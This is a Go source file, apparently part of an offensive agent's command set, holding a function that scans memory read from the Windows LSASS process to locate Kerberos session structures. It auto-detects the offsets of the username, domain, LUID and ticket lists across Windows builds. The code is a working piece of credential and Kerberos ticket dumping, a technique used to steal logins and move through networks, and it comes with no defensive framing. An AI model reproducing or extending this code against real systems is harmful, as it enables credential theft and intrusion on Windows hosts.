//go:build windows
// +build windows

package commands

import (
	"encoding/binary"
	"fmt"
)

// probeKerbSessionLayout reads raw session bytes and scans for
// LSA_UNICODE_STRING patterns to auto-detect the credentials offset.
// This handles build-specific variations in the session struct that differ
// across Windows cumulative updates.
// Returns an adjusted layout if valid LSA_UNICODE_STRINGs are found.
func probeKerbSessionLayout(r lsassReader, sessionBase uintptr, base kerbSessionLayout) kerbSessionLayout {
	probeSize := uint32(0x200)
	raw, err := r.Read(sessionBase, probeSize)
	if err != nil || len(raw) < 0x100 {
		return base
	}

	type uniCandidate struct {
		off    int
		length uint16
		bufPtr uintptr
	}

	var candidates []uniCandidate
	for off := 0; off+16 <= len(raw); off += 8 {
		length := binary.LittleEndian.Uint16(raw[off : off+2])
		maxLen := binary.LittleEndian.Uint16(raw[off+2 : off+4])
		bufPtr := uintptr(binary.LittleEndian.Uint64(raw[off+8 : off+16]))

		if length == 0 || length > 1024 || length%2 != 0 {
			continue
		}
		if maxLen < length {
			continue
		}
		if bufPtr == 0 {
			continue
		}

		candidates = append(candidates, uniCandidate{off, length, bufPtr})
	}

	// Strategy 1: consecutive UserName+DomainName pair (most reliable)
	for i := 0; i+1 < len(candidates); i++ {
		a, b := candidates[i], candidates[i+1]
		if b.off-a.off != 16 {
			continue
		}

		str, sErr := readRemoteLSAUnicodeString(r, raw[a.off:a.off+16])
		if sErr != nil || str == "" {
			continue
		}

		return adjustLayout(base, a.off, b.off)
	}

	// Strategy 2: single LSA_UNICODE_STRING match with valid remote string.
	// SYSTEM sessions may have uninitialized DomainName — compute shift from
	// the known UserName offset relative to the base layout.
	for _, c := range candidates {
		if c.off <= base.UserNameOff {
			continue
		}
		str, sErr := readRemoteLSAUnicodeString(r, raw[c.off:c.off+16])
		if sErr != nil || str == "" {
			continue
		}
		return adjustLayout(base, c.off, c.off+16)
	}

	return base
}

func adjustLayout(base kerbSessionLayout, userOff, domOff int) kerbSessionLayout {
	shift := userOff - base.UserNameOff
	adjusted := base
	adjusted.Name = fmt.Sprintf("%s_probed_u%02X", base.Name, userOff)
	adjusted.LUIDOff = base.LUIDOff + shift
	adjusted.UserNameOff = userOff
	adjusted.DomainOff = domOff
	adjusted.Tickets1Off = base.Tickets1Off + shift
	adjusted.Tickets2Off = base.Tickets2Off + shift
	adjusted.Tickets3Off = base.Tickets3Off + shift
	adjusted.NodeReadSize = base.NodeReadSize + shift
	return adjusted
}
